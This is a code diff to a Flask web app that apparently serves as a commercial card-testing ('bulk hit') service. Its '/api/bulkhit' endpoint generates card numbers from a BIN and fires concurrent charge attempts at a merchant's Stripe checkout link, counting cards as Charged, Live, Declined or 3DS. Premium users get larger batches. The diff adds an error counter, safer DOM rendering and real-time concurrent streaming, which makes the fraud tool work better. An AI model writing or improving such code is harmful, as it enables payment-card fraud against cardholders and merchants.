@@ -6978,7 +6978,7 @@ input:focus,select:focus{border-color:var(--accent)}
 .results-wrap{display:none}
 .results-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
 .results-header h3{font-size:14px;font-weight:700;color:var(--accent)}
-.summary-row{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
+.summary-row{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:12px}
 .stat-box{background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:10px;padding:10px;text-align:center}
 .stat-box .n{font-size:22px;font-weight:800;line-height:1}
 .stat-box .l{font-size:11px;color:var(--muted);margin-top:2px}
@@ -6986,6 +6986,7 @@ input:focus,select:focus{border-color:var(--accent)}
 .stat-live .n{color:var(--blue)}
 .stat-declined .n{color:var(--red)}
 .stat-tds .n{color:var(--yellow)}
+.stat-error .n{color:var(--red);opacity:.7}
 table{width:100%;border-collapse:collapse;font-size:12px}
 th{text-align:left;color:var(--muted);font-weight:600;padding:6px 8px;border-bottom:1px solid var(--border)}
 td{padding:7px 8px;border-bottom:1px solid rgba(255,105,180,.06);font-family:var(--mono);font-size:11px;word-break:break-all}
@@ -7052,6 +7053,7 @@ tr:last-child td{border-bottom:none}
         <div class="stat-box stat-live"><div class="n" id="cntLive">0</div><div class="l">💚 Live</div></div>
         <div class="stat-box stat-declined"><div class="n" id="cntDeclined">0</div><div class="l">🔴 Declined</div></div>
         <div class="stat-box stat-tds"><div class="n" id="cnt3ds">0</div><div class="l">🔒 3DS</div></div>
+        <div class="stat-box stat-error"><div class="n" id="cntError">0</div><div class="l">❌ Errors</div></div>
       </div>
       <table>
         <thead><tr><th>#</th><th>Card</th><th>Status</th><th>Response</th></tr></thead>
@@ -7065,10 +7067,15 @@ tr:last-child td{border-bottom:none}
 <script>
 var totalCards = 0, doneCards = 0;
 var cnt = {charged:0, live:0, declined:0, tds:0, error:0};
+var activeES = null; // current EventSource reference
 
 function showAlert(msg, type){
-  document.getElementById('alertBox').innerHTML =
-    '<div class="alert alert-' + type + '">' + msg + '</div>';
+  var div = document.createElement('div');
+  div.className = 'alert alert-' + type;
+  div.textContent = msg;
+  var box = document.getElementById('alertBox');
+  box.innerHTML = '';
+  box.appendChild(div);
 }
 
 function clearAlert(){ document.getElementById('alertBox').innerHTML = ''; }
@@ -7100,7 +7107,7 @@ function startBulkHit(){
   // Reset
   totalCards = count; doneCards = 0;
   cnt = {charged:0, live:0, declined:0, tds:0, error:0};
-  ['cntCharged','cntLive','cntDeclined','cnt3ds'].forEach(function(id){
+  ['cntCharged','cntLive','cntDeclined','cnt3ds','cntError'].forEach(function(id){
     document.getElementById(id).textContent = '0';
   });
   document.getElementById('resultsBody').innerHTML = '';
@@ -7118,13 +7125,14 @@ function startBulkHit(){
   formData.append('bin', bin);
   formData.append('count', count);
 
-  var es = new EventSource('/api/bulkhit?' + new URLSearchParams({url:url, bin:bin, count:count}));
+  if(activeES){ activeES.close(); activeES = null; }
+  activeES = new EventSource('/api/bulkhit?' + new URLSearchParams({url:url, bin:bin, count:count}));
 
-  es.onmessage = function(e){
+  activeES.onmessage = function(e){
     try{ handleEvent(JSON.parse(e.data)); } catch(ex){ console.error(ex); }
   };
-  es.onerror = function(){
-    es.close();
+  activeES.onerror = function(){
+    if(activeES){ activeES.close(); activeES = null; }
     finishHit();
     showAlert('Connection error. Results may be incomplete.', 'error');
   };
@@ -7132,7 +7140,7 @@ function startBulkHit(){
 
 function handleEvent(ev){
   if(ev.type === 'init'){
-    document.getElementById('resultsTitle').innerHTML =
+    document.getElementById('resultsTitle').textContent =
       '⚡ ' + (ev.merchant || 'Unknown') + ' — ' + (ev.currency||'') + ' ' + (ev.price||'');
     totalCards = ev.count || totalCards;
     return;
@@ -7146,26 +7154,42 @@ function handleEvent(ev){
     else if(normSt === 'LIVE'){ cnt.live++; document.getElementById('cntLive').textContent = cnt.live; }
     else if(normSt === '3DS_REQUIRED' || normSt === '3DS'){ cnt.tds++; document.getElementById('cnt3ds').textContent = cnt.tds; }
     else if(normSt === 'DECLINED'){ cnt.declined++; document.getElementById('cntDeclined').textContent = cnt.declined; }
-    else { cnt.error++; }
+    else { cnt.error++; document.getElementById('cntError').textContent = cnt.error; }
 
     var pct = totalCards > 0 ? Math.round(doneCards/totalCards*100) : 0;
     document.getElementById('progressFill').style.width = pct + '%';
     document.getElementById('progressLabel').textContent = doneCards + ' / ' + totalCards;
 
+    // Build row using DOM nodes — no innerHTML for untrusted data (XSS safe)
     var tbody = document.getElementById('resultsBody');
     var tr = document.createElement('tr');
-    tr.innerHTML = '<td>' + doneCards + '</td>'
-      + '<td><code>' + (ev.card||'') + '</code></td>'
-      + '<td>' + tagHtml(normSt) + '</td>'
-      + '<td>' + (ev.response||'').substring(0,80) + '</td>';
+
+    var tdNum = document.createElement('td');
+    tdNum.textContent = doneCards;
+
+    var tdCard = document.createElement('td');
+    var codeEl = document.createElement('code');
+    codeEl.textContent = ev.card || '';
+    tdCard.appendChild(codeEl);
+
+    var tdStatus = document.createElement('td');
+    tdStatus.innerHTML = tagHtml(normSt); // tagHtml only returns safe hardcoded HTML
+
+    var tdResp = document.createElement('td');
+    tdResp.textContent = (ev.response || '').substring(0, 80); // textContent — safe
+
+    tr.appendChild(tdNum);
+    tr.appendChild(tdCard);
+    tr.appendChild(tdStatus);
+    tr.appendChild(tdResp);
     tbody.appendChild(tr);
     tbody.scrollTop = tbody.scrollHeight;
     return;
   }
   if(ev.type === 'done' || ev.type === 'error'){
+    if(activeES){ activeES.close(); activeES = null; }
     if(ev.type === 'error') showAlert(ev.message || 'Error occurred.', 'error');
     finishHit();
-    // Close SSE if still attached
     return;
   }
 }
@@ -7188,16 +7212,18 @@ function finishHit(){
 @app.route('/api/bulkhit', methods=['GET'])
 @user_required
 def api_bulkhit():
-    """SSE streaming endpoint — generates cards from BIN and hits them concurrently."""
+    """SSE streaming endpoint — generates cards from BIN and hits them truly concurrently.
+    Results are streamed in real time via a thread+queue pattern as each card completes.
+    """
     from flask import Response, stream_with_context
-    import asyncio, json as _json, threading
+    import asyncio, json as _json, threading, queue as _queue
 
     user_id = session.get('user_id')
     user_info = get_user_info(user_id)
     is_prem = user_info.get('type') in ('premium', 'owner')
     max_cards = 50 if is_prem else 10
 
-    url   = request.args.get('url', '').strip()
+    url     = request.args.get('url', '').strip()
     bin_str = request.args.get('bin', '').strip()
     count_str = request.args.get('count', '10').strip()
 
@@ -7207,7 +7233,6 @@ def api_bulkhit():
         count = 10
 
     def generate():
-        # Validate URL
         from modules.auto_hitter import (
             extract_checkout_url, parse_gen_input, generate_cards_from_bin,
             parse_cards as ah_parse_cards, charge_card,
@@ -7215,6 +7240,7 @@ def api_bulkhit():
         )
         from modules.stripe_tls import get_checkout_info as tls_checkout_info
 
+        # ── Validate inputs ─────────────────────────────────────────────────
         checkout_url = extract_checkout_url(url)
         if not checkout_url:
             yield f"data: {_json.dumps({'type':'error','message':'Invalid Stripe checkout URL. Use buy.stripe.com or checkout.stripe.com links.'})}\n\n"
@@ -7233,56 +7259,90 @@ def api_bulkhit():
             yield f"data: {_json.dumps({'type':'error','message':'Failed to generate cards from BIN.'})}\n\n"
             return
 
-        # Run async operations in a dedicated event loop
+        # ── Fetch checkout info synchronously first ───────────────────────
         loop = asyncio.new_event_loop()
         try:
-            # Fetch checkout info
             checkout_data = loop.run_until_complete(tls_checkout_info(checkout_url, None))
         except Exception as ex:
-            yield f"data: {_json.dumps({'type':'error','message': 'Checkout fetch failed: ' + str(ex)[:120]})}\n\n"
             loop.close()
+            yield f"data: {_json.dumps({'type':'error','message':'Checkout fetch failed: ' + str(ex)[:120]})}\n\n"
             return
 
         if not checkout_data.get('pk') or not checkout_data.get('cs'):
-            yield f"data: {_json.dumps({'type':'error','message':'Could not parse checkout URL. Make sure it is a valid active Stripe link.'})}\n\n"
             loop.close()
+            yield f"data: {_json.dumps({'type':'error','message':'Could not parse checkout URL. Make sure it is a valid active Stripe link.'})}\n\n"
             return
 
         merchant = str(checkout_data.get('merchant') or 'Unknown')[:40]
-        price = checkout_data.get('price')
+        price    = checkout_data.get('price')
         currency = checkout_data.get('currency', 'USD')
-        sym = ah_currency_symbol(currency)
+        sym      = ah_currency_symbol(currency)
         price_str = f"{sym}{price:.2f}" if price else 'N/A'
         checkout_data['email'] = 'checkout@gmail.com'
 
         yield f"data: {_json.dumps({'type':'init','merchant':merchant,'price':price_str,'currency':currency,'count':len(cards)})}\n\n"
 
-        # Hit cards concurrently
-        async def _hit_all(cards_list, co_data):
+        # ── True concurrent streaming via thread + queue ──────────────────
+        # Each card result is put on the queue as soon as it completes.
+        # The sync generator reads from the queue and yields SSE events immediately.
+        result_queue = _queue.Queue()
+
+        async def _hit_all_streaming():
             async def _one(card):
                 try:
-                    return card, await charge_card(card, co_data, None, None)
+                    res = await charge_card(card, checkout_data, None, None)
                 except Exception as ex:
-                    return card, {'status': 'ERROR', 'response': str(ex)[:60]}
-            tasks = [_one(c) for c in cards_list]
-            return await asyncio.gather(*tasks)
+                    res = {'status': 'ERROR', 'response': str(ex)[:60]}
+                return card, res
 
-        try:
-            hit_results = loop.run_until_complete(_hit_all(cards, checkout_data))
-        except Exception as ex:
-            yield f"data: {_json.dumps({'type':'error','message':'Hit error: ' + str(ex)[:120]})}\n\n"
-            loop.close()
-            return
-        finally:
-            loop.close()
+            tasks = [_one(c) for c in cards]
+            for coro in asyncio.as_completed(tasks):
+                try:
+                    card, result = await coro
+                    result_queue.put(('result', card, result))
+                except Exception as ex:
+                    result_queue.put(('result', None, {'status': 'ERROR', 'response': str(ex)[:60]}))
+            result_queue.put(('done', None, None))
 
-        for idx, (card, result) in enumerate(hit_results):
-            status = result.get('status', 'ERROR')
-            card_str = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
-            response_text = str(result.get('response', ''))[:80]
-            yield f"data: {_json.dumps({'type':'result','idx':idx,'card':card_str,'status':status,'response':response_text})}\n\n"
+        def _run_loop():
+            try:
+                loop.run_until_complete(_hit_all_streaming())
+            except Exception as ex:
+                result_queue.put(('error', None, str(ex)[:150]))
+            finally:
+                loop.close()
 
-        yield f"data: {_json.dumps({'type':'done','message':'Complete'})}\n\n"
+        t = threading.Thread(target=_run_loop, daemon=True)
+        t.start()
+
+        # Read results from queue and stream as SSE events
+        idx = 0
+        while True:
+            item = result_queue.get()
+            kind = item[0]
+
+            if kind == 'done':
+                yield f"data: {_json.dumps({'type':'done','message':'Complete'})}\n\n"
+                break
+
+            if kind == 'error':
+                yield f"data: {_json.dumps({'type':'error','message': item[2]})}\n\n"
+                break
+
+            # kind == 'result'
+            card, result = item[1], item[2]
+            if card is None:
+                idx += 1
+                continue
+
+            status       = result.get('status', 'ERROR')
+            card_str     = f"{card['cc'][:6]}****{card['cc'][-4:]}|{card['month']}|{card['year']}"
+            response_txt = str(result.get('response', ''))[:80]
+
+            yield f"data: {_json.dumps({'type':'result','idx':idx,'card':card_str,'status':status,'response':response_txt})}\n\n"
+            idx += 1
+
+        t.join(timeout=5)
 
     return Response(
         stream_with_context(generate()),
